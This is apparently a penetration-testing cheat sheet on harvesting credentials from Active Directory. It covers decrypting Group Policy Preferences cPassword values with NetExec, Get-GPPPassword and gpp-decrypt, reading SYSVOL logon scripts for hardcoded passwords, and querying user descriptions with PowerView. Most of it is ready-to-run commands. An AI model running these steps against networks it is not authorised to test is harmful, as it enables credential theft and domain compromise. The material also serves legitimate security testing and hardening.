---
title: Credential Pillaging
date: 2026-06-30 16:45:53
categories:
  - Active Directory
  - Exploitation
  - Credential Pillaging
tags:
  - PowerView
  - Privilege-Escalation
  - Windows
  - Active-Directory
  - NetExec
  - Credential-Pillaging
  - Credential-Access
  - GPP
  - Group-Policy-Preferences
  - cPassword
  - SYSVOL
  - Logon-Scripts
  - Get-GPPPassword
  - gpp-decrypt
  - Active-Directory-Attributes
  - User-Descriptions
  - ADIDNSDump
  - Active-Directory-DNS
  - GPO
  - GPO-Abuse
  - SharpGPOAbuse
  - pyGPOAbuse
---

> ➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.

## Group Policy Preferences (GPP)

> ➜ Older versions of Group Policy Preferences stored passwords in the `cPassword` attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered `cPassword` value can be decrypted.

#### Linux

##### Search for GPP Passwords

> NetExec : Its `gpp_password` module locates and automatically decrypts GPP passwords in SYSVOL.

```bash
nxc smb <DC_IP> -u <user> -p <pass> -M gpp_password
```

##### Search for GPP AutoLogon Credentials

> NetExec : The `gpp_autologin` module retrieves auto-logon credentials stored in `Registry.xml`.

```bash
nxc smb <DC_IP> -u <user> -p <pass> -M gpp_autologin
```

#### Windows

> Import the script Get-GPPPassword

```powershell
Import-Module .\Get-GPPPassword.ps1
```

> Retrieve GPP Passwords with Get-GPPPassword

```powershell
Get-GPPPassword
```

#### Manual Retrieval

> Browse a policy’s Preferences directory to find a `Groups.xml` file containing a `cPassword`.

```powershell
cat \\<DC>\SYSVOL\<DOMAIN>\Policies\<GUID>\Machine\Preferences\Groups\Groups.xml
```

> Decrypt a GPP cPassword

```bash
gpp-decrypt <cPassword>
```

## SYSVOL Script Pillaging

> ➜ SYSVOL stores logon scripts that may contain hardcoded credentials, mapped-drive passwords, or sensitive administrative commands.

> List the logon scripts and policy files stored in the SYSVOL scripts directory.

```powershell
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
```

> Read a logon script to look for hardcoded credentials or mapped-drive passwords.

```powershell
cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<SCRIPT>
```

## Credentials Stored in Active Directory

> ➜ Administrators sometimes store passwords or other sensitive information directly in Active Directory user attributes.

> Import PowerView

```powershell
Import-Module .\PowerView.ps1
```

> Enumerate User Descriptions : List all users whose description field is populated, as it may contain a password.

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.description -ne $null}
```
